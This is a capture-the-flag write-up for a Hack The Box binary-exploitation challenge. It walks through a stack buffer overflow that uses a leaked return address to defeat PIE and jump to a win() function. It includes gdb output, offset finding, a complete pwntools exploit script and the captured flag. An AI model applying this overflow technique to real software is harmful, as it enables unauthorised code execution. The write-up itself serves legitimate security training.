---
title: "Getting Started 🚀 - PIE base calculation & ret2win exploit"
tags: [HTB, binary exploitation, return to win, PIE, pwn]
---

# Getting Started 🚀

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

Your final warm-up in the world of binary exploitation — a buffer overflow with a return-to-win twist, and a splash of PIE to spice things up.

## 📚 Table of Contents
- [Binary Protections Analysis 🛡️](#binary-protections-analysis-️)
- [Program Behavior 📟](#program-behavior-)
- [Stack Layout & Leaks 🔍](#stack-layout--leaks-)
- [Calculating the PIE Base 🎯](#calculating-the-pie-base-)
- [Exploitation Strategy 💣](#exploitation-strategy-)
- [Full Exploit Script 🧨](#full-exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections Analysis 🛡️

Output of `checksec ./gs`:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'./glibc/'
Stripped:   No
```

**PIE (Position Independent Executable)** means addresses like `main()` or `win()` are randomized each time. 

But, spoiler: luckily, the binary leaks the return address.

## Program Behavior 📟

When executed, the binary prints out parts of the stack and includes a key hint:
```
Fill the 32-byte buffer, overwrite the alignment address and the "target's" 0xdeadbeef value.
```

But we go further — using a classic buffer overflow to overwrite RIP and redirect execution.

## Stack Layout & Leaks 🔍

The binary leaks something like:

```
0x00007ffdf9f61310 | 0x000055a247675800 <- Saved rbp
0x00007ffdf9f61318 | 0x00007f6232821c87 <- Saved return address
```

This tells us the saved RIP is at `0x7f6232821c87`. 

From basic 'reverse engineering' with objdump, we can see that:

- `main()` is located at offset `0x16a0`
- `win()` is at offset `0x11f5`

This allows us to compute the PIE base.

## Calculating the PIE Base 🎯

The leaked return address (`leaked_ret`) is the address of the next execution after the show_stack function call, as we can see in gdb:

```c
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000000016a0 <+0>:	push   rbp
   ...
   0x0000000000001722 <+130>:	call   0x13f9 <show_stack>
   0x0000000000001727 <+135>:	lea    rdi,[rip+0xbba]
```

So the next execution after the show_stack function is:

`0x0000000000001727 <+135>:	lea    rdi,[rip+0xbba]`

Main function starts at `0x00000000000016a0`. With gdb, we can easily find the distance of these addresses:

```c
pwndbg> disass main
Dump of assembler code for function main:
   ...
   0x00000000000017dc <+316>:	call   0x11f5 <win>
   ...
End of assembler dump.
pwndbg> distance 0x00000000000016a0 0x0000000000001727
0x16a0->0x1727 is 0x87 bytes (0x10 words)
pwndbg> distance 0x00000000000011f5 0x00000000000016a0
0x11f5->0x16a0 is 0x4ab bytes (0x95 words)
```

This leaked return address corresponds to the instruction at main + 0x87, which is just after the call to show_stack.

Same for the win function, we are able to see that there are 0x4ab bytes between main and the win function.

We can use it to get the PIE base, and calculate the win address.

```python
leaked_ret = 0x7f6232821c87
offset_to_ret = 0x87  # difference from ret addr to start of main
main_offset = 0x16a0  # from ELF symbols
win_offset = 0x11f5  # from ELF symbols
base = leaked_ret - offset_to_ret - main_offset
win_addr = base + win_offset
```

Or `win_addr = leaked_ret - offset_to_ret - 0x4ab`, as `leaked_ret - offset_to_ret` is the runtime address of main, and `0x4ab` the distance between main and win.

But the first solution is better as we use dynamic offsets from ELF symbols. 

This gives us the **actual runtime address of `win()`**, despite PIE.

### Bonus: Without PIE base calculation

Also in this case, we can bypass the calculation of the PIE base: 

- We know the offset of the leaked ret address `0x0000000000001727 <+135>:	lea    rdi,[rip+0xbba]`
- We can calculate the offset between this ret address and the start of the win function
- So we can simply do: `win_addr = leaked_ret - calculated_offset` (where calculated_offset = the distance from ret address to the start of win.)

Let's just disassemble with gdb and calculate the distance: 

```c
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000000016a0 <+0>:	push   rbp
   ...
   0x0000000000001727 <+135>:	lea    rdi,[rip+0xbba]
...
pwndbg> disass win
Dump of assembler code for function win:
   0x00000000000011f5 <+0>:	push   rbp
   ...
pwndbg> distance 0x00000000000011f5 0x0000000000001727
0x11f5->0x1727 is 0x532 bytes (0xa6 words)
```

## Exploitation Strategy 💣

The vulnerable buffer is 32 bytes, but we need to overwrite RIP. 

With gdb and cyclic, we're able to find the exact offset: 56.

```bash
pwndbg> cyclic 1000
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
pwndbg> run
...
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
◉                                                                                                 ◉
◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
◉                                                                                                 ◉
◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉

>> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaae
...
Program received signal SIGSEGV, Segmentation fault.
0x00005555555557ff in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────
 RAX  0
 RBX  0
 RCX  0
 RDX  0x7ffff7bed8c0 ◂— 0
 RDI  1
 RSI  0x7fffffffb5f0 ◂— 0x6d31333b315b1b0a
 R8   0x19
 R9   7
 R10  0xfffffff9
 R11  0x246
 R12  0x555555555110 (_start) ◂— xor ebp, ebp
 R13  0x7fffffffdda0 ◂— 0x626161616161616a ('jaaaaaab')
 R14  0
 R15  0
 RBP  0x6161616161616167 ('gaaaaaaa')
 RSP  0x7fffffffdcc8 ◂— 0x6161616161616168 ('haaaaaaa')
 RIP  0x5555555557ff (main+351) ◂— ret 
...
pwndbg> cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

```
payload = b"A"*56 + p64(win_addr)
```

## Full Exploit Script 🧨

```python
#!/usr/bin/env python3
from pwn import *
import argparse
import re

context.binary = './gs'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def calculate_addresses(leaked_ret):
    offset_to_ret = 0x87  # difference from ret addr to start of main
    main_offset = elf.symbols['main']
    win_offset = elf.symbols['win']
    base = leaked_ret - offset_to_ret - main_offset
    win_addr = base + win_offset # classic PIE base calc
    fast_win_addr = leaked_ret - 0x532 # direct ret2win via offset from leak
    return base, win_addr, fast_win_addr

def perform_exploit(p):
    output = p.recvuntil(b">>", timeout=2).decode()
    match = re.search(r"0x[0-9a-f]+ \| (0x[0-9a-f]+) <- Saved return address", output)
    assert match, "Couldn't find leaked return address in output"
    leaked_ret = int(match.group(1), 16)

    base, win_addr, fast_win_addr = calculate_addresses(leaked_ret)
    log.info(f"PIE base calculated: {hex(base)}")
    log.info(f"Resolved win() address with PIE base: {hex(win_addr)}")
    log.info(f"Resolved win() address without PIE base: {hex(fast_win_addr)}")

    payload = b"A" * 56 + p64(fast_win_addr)
    p.sendline(payload)
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit for Getting Started (HTB)")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()

    p = get_process(args)
    perform_exploit(p)

if __name__ == '__main__':
    main()
```

## Exploitation Result ✅

After sending the payload:

```bash
└──╼ $python exploit.py --host 94.237.58.4 --port 59680
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    Stripped:   No
[+] Opening connection to 94.237.58.4 on port 59680: Done
[*] PIE base calculated: 0x7f7aeac0d560
[*] Resolved win() address with PIE base: 0x7f7aeac0e755
[*] Resolved win() address without PIE base: 0x7f7aeac0e755
[*] Switching to interactive mode
 

      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffcd4a2a520 | 0x4141414141414141 <- Start of buffer
0x00007ffcd4a2a528 | 0x4141414141414141
0x00007ffcd4a2a530 | 0x4141414141414141
0x00007ffcd4a2a538 | 0x4141414141414141
0x00007ffcd4a2a540 | 0x4141414141414141 <- Dummy value for alignment
0x00007ffcd4a2a548 | 0x4141414141414141 <- Target to change
0x00007ffcd4a2a550 | 0x4141414141414141 <- Saved rbp
0x00007ffcd4a2a558 | 0x00007f7aeac0e755 <- Saved return address
0x00007ffcd4a2a560 | 0x0000002000000000
0x00007ffcd4a2a568 | 0x00007ffcd4a2a638

HTB{b0f_tut0r14l5_4r3_g00d}
```

## Conclusion 🧾

This was a great intro to real-world exploitation techniques:

- Stack leak → PIE base deduction
- RIP control via buffer overflow
- Return-to-win without gadgets

Solid practice for more complex ROP chains, GOT overwrite, or full ret2libc. 💣

🔙 [Back to Challenge Writeups](../../)